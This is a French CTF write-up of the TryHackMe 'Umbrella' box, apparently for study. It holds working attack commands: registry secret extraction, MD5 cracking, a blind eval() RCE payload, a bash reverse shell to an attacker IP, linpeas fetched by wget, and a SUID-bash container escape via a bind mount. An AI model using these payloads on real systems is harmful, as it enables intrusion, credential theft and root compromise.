# TryHackMe — Umbrella — Writeup

> Thème *Resident Evil / Umbrella Corp*. Machine Linux orientée **Docker** : registry exposé, injection de code Node.js, puis évasion de conteneur vers l'hôte.
> Difficulté ressentie : moyenne. Compétences : énumération Docker, RCE via `eval`, énumération de privesc, évasion de conteneur par bind-mount + SUID.

**Sommaire**

1. [Reconnaissance](#1-reconnaissance)
2. [Docker Registry exposé (port 5000)](#2-docker-registry-exposé-port-5000)
3. [Extraction des secrets de l'image](#3-extraction-des-secrets-de-limage)
4. [Énumération MySQL (port 3306)](#4-énumération-mysql-port-3306)
5. [Cassage des hashs](#5-cassage-des-hashs)
6. [Foothold : injection de code dans l'app (port 8080)](#6-foothold--injection-de-code-dans-lapp-port-8080)
7. [Reconnaissance dans le conteneur](#7-reconnaissance-dans-le-conteneur)
8. [Accès user : SSH](#8-accès-user--ssh)
9. [Énumération de privesc sur l'hôte](#9-énumération-de-privesc-sur-lhôte)
10. [Root : évasion de conteneur via bind-mount + SUID](#10-root--évasion-de-conteneur-via-bind-mount--suid)
11. [Erreurs commises](#11-erreurs-commises)
12. [Leçons apprises](#12-leçons-apprises)

> Dans tout ce writeup, la cible est désignée par `umbrella.thm` (ajoutez l'IP dans `/etc/hosts`). Les drapeaux (`user.txt`, `root.txt`) ne sont pas inclus.

---

## 1. Reconnaissance

### Scan de ports

```bash
nmap -sS -sC -sV -p- umbrella.thm        # découverte complète
nmap -sS -sC -sV -p 22,3306,5000,8080 umbrella.thm -oN scan_syn
```

Résultat :

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu (auth par mot de passe activée) |
| 3306/tcp | MySQL | MySQL 5.7.40 (accessible à distance) |
| 5000/tcp | HTTP | **Docker Registry (API v2.0)** |
| 8080/tcp | HTTP | Node.js / Express — page de *Login* « Time Tracking » |

### Scan applicatif (nuclei)

```bash
nuclei -u http://umbrella.thm:8080
```

Points notables :
- `node-express-dev-env` *(medium)* → Express en **mode développement**.
- Cookie de session `connect.sid` (`express-session`), `HttpOnly` mais sans `Secure`/`SameSite`.
- Tous les en-têtes de sécurité HTTP absents.

### Technologies / protocoles identifiés

- **Docker Registry v2** sur le 5000 → misconfiguration classique si exposé sans authentification.
- **Express (Node.js)** en dev mode sur le 8080.
- **MySQL 5.7.40** exposé.
- **OpenSSH 8.2p1** (Ubuntu 20.04).

> **Vulnérabilités connues recherchées :** un Docker Registry v2 ouvert permet de lister et *pull* les images (fuite de code source et de secrets) ; Express en dev mode fuit des stack traces détaillées. La piste n°1 est clairement le registry.

---

## 2. Docker Registry exposé (port 5000)

Test d'authentification — un registry sécurisé renvoie `401` sur `/v2/` :

```bash
curl -s http://umbrella.thm:5000/v2/
# {}   → 200 OK, PAS de 401 → registry ouvert
```

Catalogue des dépôts :

```bash
curl -s http://umbrella.thm:5000/v2/_catalog
# {"repositories":["umbrella/timetracking"]}
```

Tags + manifest de l'image :

```bash
curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list
# {"name":"umbrella/timetracking","tags":["latest"]}

curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest
```

Le manifest donne le **digest du blob de config** (champ `.config.digest`) et la liste des **layers** (`.layers[].digest`).

---

## 3. Extraction des secrets de l'image

Le **blob de config** d'une image Docker contient les variables d'environnement de build, l'`ENTRYPOINT`/`CMD` et l'historique des commandes — souvent une mine de secrets. On le télécharge directement par son digest :

```bash
curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/blobs/sha256:<digest_config> -o config.json
jq -r '.config.Env[]' config.json
```

Résultat :

```
DB_HOST=db
DB_USER=root
DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5
DB_DATABASE=timetracking
LOG_FILE=/logs/tt.log
```

> Le mot de passe est une **notation d'échecs** (`Ng1-f3! Pe7-e5? Nf3xe5`), clin d'œil au thème.

L'historique de build (`jq -r '.history[].created_by' config.json`) révèle aussi la structure de l'app (`app.js`, `public/`, `views/`, `npm install`) — l'application Node du port 8080.

> **Format d'URL d'un blob :** `http://<host>:5000/v2/<repo>/blobs/<digest>`. On peut aussi tout rapatrier proprement avec `docker pull`, `skopeo copy`, ou l'outil **DockerRegistryGrabber**.

---

## 4. Énumération MySQL (port 3306)

Le `DB_HOST=db` est interne au réseau Docker, mais **MySQL est aussi publié sur le 3306 en externe**. On tente les creds root récupérées.

> ⚠️ Sur Kali, le client `mysql` est en réalité **MariaDB** → il ne connaît pas `--ssl-mode`. Il faut utiliser `--skip-ssl-verify-server-cert` (ou `--skip-ssl`).

```bash
mysql -h umbrella.thm -P 3306 -u root -p'Ng1-f3!Pe7-e5?Nf3xe5' --skip-ssl-verify-server-cert
```

Connexion **root** réussie. Énumération :

```sql
SHOW DATABASES;                 -- ... timetracking
USE timetracking; SHOW TABLES;  -- users
SELECT * FROM users;
```

```
claire-r  2ac9cb7dc02b3c0083eb70898e549b63  360
chris-r   0d107d09f5bbe40cade3de5c71e9e9b7  420
jill-v    d5c0607301ad5d5c1528962a83992ac8  564
barry-b   4a04890400b5d7bac101baace5d7e994  47893
```

Vérification des capacités d'écriture/lecture de fichiers :

```sql
SELECT @@secure_file_priv;   -- /var/lib/mysql-files/
SELECT LOAD_FILE('/etc/passwd');  -- NULL
SELECT @@hostname;           -- ecfd3fea4eaa  (ID de conteneur)
```

> **Impasse MySQL → RCE :** `secure_file_priv` limite `LOAD_FILE`/`INTO OUTFILE` à un seul dossier, et MySQL tourne dans **son propre conteneur**. Pas de lecture/écriture de fichier sur l'hôte par cette voie. La vraie valeur de MySQL = les **4 identifiants**.

---

## 5. Cassage des hashs

Les `pass` sont des **MD5 non salés** (`varchar(32)`). Cassage hors-ligne :

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# ou
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

| Utilisateur | Mot de passe |
|-------------|--------------|
| claire-r | `Password1` |
| chris-r | `letmein` |
| jill-v | `sunshine1` |
| barry-b | `sandwich` |

Les noms (personnages Resident Evil, format `prénom-initiale`) ressemblent à des logins système → candidats SSH **et** comptes du login web.

---

## 6. Foothold : injection de code dans l'app (port 8080)

En se connectant à l'app web avec un des comptes (ex. `chris-r:letmein`), on découvre une fonctionnalité : saisir du **temps**, qui accepte des **expressions mathématiques** (« Pro Tip: you can also use mathematical expressions, e.g. `5+4` »).

Une app Node qui « calcule » une expression utilisateur fait très souvent un `eval()`. La requête :

```http
POST /time HTTP/1.1
Host: umbrella.thm:8080
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<session>

time=3
```

La réponse est un `302 → /`, et le total s'affiche sur le dashboard : l'injection est **aveugle** (pas de retour direct).

### Confirmer l'exécution de code (oracle temporel)

Comme le résultat n'est pas réfléchi, on utilise le **temps de réponse** : une boucle JS bloquante de ~6 s doit retarder la réponse d'autant.

```bash
# contrôle : réponse quasi instantanée
curl -s -o /dev/null -w "%{time_total}\n" -b "$C" --data 'time=2' http://umbrella.thm:8080/time

# oracle : boucle bloquante 6 s
curl -s -o /dev/null -w "%{time_total}\n" -b "$C" \
  --data-urlencode 'time=(function(){var t=Date.now();while(Date.now()-t<6000){}})()' \
  http://umbrella.thm:8080/time
```

Contrôle ≈ `0.07s`, oracle ≈ `6.14s` → **exécution de code JavaScript confirmée (RCE)**.

Le code source (récupéré plus tard) confirme la cause :

```js
let timeCalc = parseInt(eval(request.body.time));   // eval() sur l'entrée utilisateur
// ...
app.use(session({secret: "Your secret key", cookie:{secure:false}}));  // secret en dur
```

### Reverse shell

On lance un listener (`nc -lvnp 4444`) puis on injecte, via `child_process`, un reverse shell :

```js
require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VOTRE_IP>/4444 0>&1"')
```

Corps de requête (URL-encodé, le `&` de `>&`/`0>&1` **doit** être `%26` sinon il coupe le paramètre) :

```
time=require%28%27child_process%27%29.exec%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP>%2F4444%200%3E%261%22%27%29
```

→ Shell obtenu. `id` renvoie **`uid=0(root)`**… mais dans un conteneur.

---

## 7. Reconnaissance dans le conteneur

```bash
cat /.dockerenv            # présent
cat /proc/1/cgroup         # /docker/<id> → conteneur
id                         # root dans le conteneur
hostname                   # de0610f51845
cat /proc/self/status | grep Cap   # CapEff=00000000a80425fb (caps Docker par défaut)
```

- Conteneur **non privilégié**, **pas de `/var/run/docker.sock`**, pas de capabilities étendues → évasions classiques fermées.
- Image `node:19-slim`.

### Le montage clé

`mount` montre un device hôte sur `/logs`, mais pas le chemin source. On lit **`/proc/self/mountinfo`**, qui expose le champ *root* (chemin côté FS source) :

```bash
grep ' /logs ' /proc/self/mountinfo
# 2321 ... /home/claire-r/timeTracker-src/logs /logs rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
```

→ `/logs` (conteneur) = **`/home/claire-r/timeTracker-src/logs`** sur l'hôte, un **bind-mount en écriture**, sur le disque réel de l'hôte (`ext4`), **sans `nosuid`**. Comme il n'y a **pas de user-namespace**, root-conteneur = uid 0 hôte : les fichiers créés y sont **`root:root` sur l'hôte**.

> **Astuce :** `/proc/self/mountinfo` (champ *root*) révèle le chemin hôte d'un bind-mount, là où `mount` et `/proc/mounts` ne montrent que le device. `findmnt /logs` est une alternative lisible.

Scan réseau interne (via `/dev/tcp`, pas de nmap dans le conteneur) :

```
172.18.0.1  → hôte (gateway) : 22,3306,5000,8080
172.18.0.2  → nous (app)
172.18.0.3  → conteneur db (MySQL)
```

---

## 8. Accès user : SSH

Les mots de passe cassés sont réutilisés sur l'hôte. `claire-r` est un utilisateur système (vu dans `/etc/passwd`) :

```bash
ssh claire-r@umbrella.thm      # mot de passe : Password1
```

→ Accès SSH obtenu, **`user.txt` dans `/home/claire-r/`**.

---

## 9. Énumération de privesc sur l'hôte

Transfert et exécution de **linpeas** :

```bash
# côté attaquant
python3 -m http.server 8000
# côté cible
wget http://<IP>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
./linpeas.sh | tee linpeas_output.txt     # sans -a : plus rapide ; -r non nécessaire ici
```

Contexte : Ubuntu 20.04, kernel 5.15.0-138, `sudo 1.8.31-1ubuntu1.5`, AWS EC2.

Comptes :
- `claire-r` (uid 1001) : **aucun groupe privilégié**.
- `user` (uid 1000, *admin*) et `ubuntu` (uid 1002) : groupes **`sudo` + `lxd`** → root trivial *si on les atteint*.

### Vecteurs testés… et tous écartés

| Vecteur | Test | Résultat |
|---------|------|----------|
| `sudo -l` (claire-r) | `sudo -l` avec `Password1` | ❌ *« claire-r may not run sudo »* (linpeas ne teste que sans mot de passe → il faut le refaire soi-même **avec** le mot de passe) |
| GPG | `gpg --list-secret-keys` | ❌ trousseau **vide** (le `~/.gnupg` observé était créé par nos propres commandes `gpg`) |
| Réutilisation de mot de passe | *spray* comptes × mots de passe en SSH | ❌ seul `claire-r:Password1` |
| Baron Samedit (CVE-2021-3156) | `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` | ❌ `sudo 1.8.31-1ubuntu1.5` **patché** (fix = 1ubuntu1.2) |
| pkexec / PwnKit | perms de `pkexec` | ❌ **pas SUID** |
| docker.sock | droits sur le socket | ❌ pas accessible à claire-r |
| SUID / cron / kernel | linpeas | ❌ rien d'exploitable (kernel patché, userns off) |

> Clés AWS IAM (metadata EC2) trouvées dans la sortie linpeas : sensibles, mais hors-scope pour le root de cette box.

L'énumération statique étant épuisée, on revient sur l'élément **délibérément placé** : le bind-mount `/logs` partagé entre le conteneur (où on est root) et le home de `claire-r`.

---

## 10. Root : évasion de conteneur via bind-mount + SUID

### Le principe

On combine deux accès sur **le même dossier** :
- **Conteneur** : root (uid 0 = root hôte, pas de user-namespace) → peut faire `chown root` + poser le **bit SUID**.
- **Hôte (claire-r)** : peut **exécuter** le binaire. Un binaire **SUID root** s'exécute avec l'euid de son propriétaire → **root**.

Conditions réunies ici : montage `rw` **sans `nosuid`** (donc SUID honoré), même inode des deux côtés, root-conteneur = uid 0 réel.

### Exploitation

**1) Côté hôte (SSH claire-r)** — copier le **bash de l'HÔTE** dans le dossier partagé (pour éviter un *mismatch* de libc avec le bash Debian du conteneur) :

```bash
cp /bin/bash /home/claire-r/timeTracker-src/logs/rootbash
```

**2) Côté conteneur (via la RCE, en root)** — s'approprier le binaire et poser le SUID :

```bash
chown root:root /logs/rootbash
chmod 4755 /logs/rootbash
ls -la /logs/rootbash        # -rwsr-xr-x 1 root root ... rootbash
```

**3) Côté hôte (claire-r)** — exécuter avec `-p` :

```bash
/home/claire-r/timeTracker-src/logs/rootbash -p
id        # uid=1001(claire-r) euid=0(root)  → ROOT
```

→ **`root.txt` dans `/root/`.**

> **`-p` est obligatoire** : sans lui, bash abandonne l'euid root au démarrage (protection anti-SUID).

### Variante
Si vous préférez un binaire dédié : un mini-C `int main(){setreuid(0,0);execl("/bin/bash","bash","-p",NULL);}` compilé **sur l'hôte** (libc compatible), déposé dans `logs/`, puis `chown root` + `chmod 4755` depuis le conteneur.

---

## 11. Erreurs commises

Rien de tel que les ratés pour apprendre. Voici les miens sur cette box :

1. **Scanner les ports via la RCE avec `execSync` (synchrone) et sans timeout par port.**
   `eval → child_process.execSync(...)` **bloque le thread unique de Node** : tant que le scan `/dev/tcp` (sans timeout, sur des ports filtrés) ne rend pas la main, **toute l'application se gèle** (réponses HTTP en timeout). 
   → **Correctif :** exécuter les commandes longues en **asynchrone** (`exec`, détaché) et mettre un **timeout par port** (`timeout 1 bash -c '...'`).

2. **Créer un script SUID au lieu d'un binaire.** (voir Leçons) — mon `privv` (script contenant `id`) avec le bit SUID restait exécuté en `claire-r`. Perte de temps avant de réaliser que **le SUID est ignoré sur les scripts**.

3. **Confondre instabilité de la box et erreur de méthode.** La machine THM tombait régulièrement **entièrement injoignable** (3306 + 5000 en timeout alors que l'ICMP et le handshake TCP passaient). J'ai d'abord suspecté un souci de MTU/VPN ou mon rythme de requêtes, avant de conclure à une **instabilité de la cible** (redéploiement nécessaire). Diagnostic utile : la bannière SSH (petits paquets) ne revenait pas non plus → ce n'était pas un problème de MTU.

4. **Oublier que le client Kali est MariaDB.** Première tentative avec `--ssl-mode=DISABLED` → `unknown variable 'ssl-mode'`. → Utiliser `--skip-ssl-verify-server-cert`.

5. **Se fier à linpeas pour `sudo -l`.** linpeas n'exécute que `sudo -n -l` (sans mot de passe). Un `sudo -l` protégé par mot de passe n'est **pas** testé → il faut le refaire manuellement **avec** le mot de passe connu avant de conclure.

---

## 12. Leçons apprises

- 🔑 **Le bit SUID ne fonctionne QUE sur des binaires ELF compilés, jamais sur des scripts** (`#!/bin/bash`, etc.). Le noyau Linux ignore délibérément le SUID sur les scripts interprétés : il lance l'interpréteur avec les privilèges de **l'appelant**, pas du propriétaire du script. Pour un SUID root, utilisez un vrai binaire (copie de `bash`, ou mini-C `setuid`/`execl`).
- **`bash -p`** est requis pour un bash SUID : sinon bash lâche l'euid root au démarrage.
- **Évasion conteneur → hôte via bind-mount + SUID** : être root dans un conteneur *non privilégié* suffit si un dossier hôte est bind-monté **`rw` sans `nosuid`** et qu'il n'y a **pas de user-namespace** (root conteneur = uid 0 hôte). On y dépose un binaire root+SUID que l'utilisateur hôte exécute. Toujours vérifier l'absence de `nosuid` dans `/proc/self/mountinfo`.
- **`/proc/self/mountinfo`** (champ *root*) révèle le **chemin hôte** d'un bind-mount, contrairement à `mount`/`/proc/mounts`.
- **RCE aveugle** : quand la sortie n'est pas réfléchie, utiliser un **oracle temporel** (boucle bloquante / `sleep`) pour prouver l'exécution, puis l'**out-of-band** (reverse shell, écriture dans un dossier servi en HTTP) pour récupérer les résultats.
- **Injection via `eval` dans `child_process`** : préférer `exec` (asynchrone) à `execSync` pour ne pas geler un serveur mono-thread.
- **Docker Registry v2 ouvert** = fuite de code source et de secrets via le **blob de config** et les layers. Réflexe : `/v2/_catalog` → manifest → blobs.
- **`secure_file_priv`** et la conteneurisation de MySQL ferment la voie « MySQL → fichier/RCE sur l'hôte ».

---

### Chaîne complète (résumé)

```
Registry Docker (5000) ouvert
  └─ blob de config → creds MySQL root
       └─ dump table users → hashs MD5 → cassés (rockyou)
            └─ login web + eval() sur /time → RCE (root dans le conteneur)
                 └─ réutilisation mot de passe → SSH claire-r (user)
                      └─ binaire SUID (bash) sur le bind-mount /logs → root
```

### Remédiations

- **Registry** : activer l'authentification, ne pas l'exposer.
- **App** : ne jamais passer d'entrée utilisateur à `eval()` ; utiliser un parseur d'expressions sûr (`mathjs` en mode restreint). Passer Express en `NODE_ENV=production`. Ne pas stocker de secrets en clair dans l'image.
- **Mots de passe** : pas de MD5 non salé ; pas de réutilisation entre services web et comptes système.
- **Conteneur** : monter les volumes en **`nosuid,nodev`**, utiliser un **user-namespace** (remap) et ne pas faire tourner l'app en root.
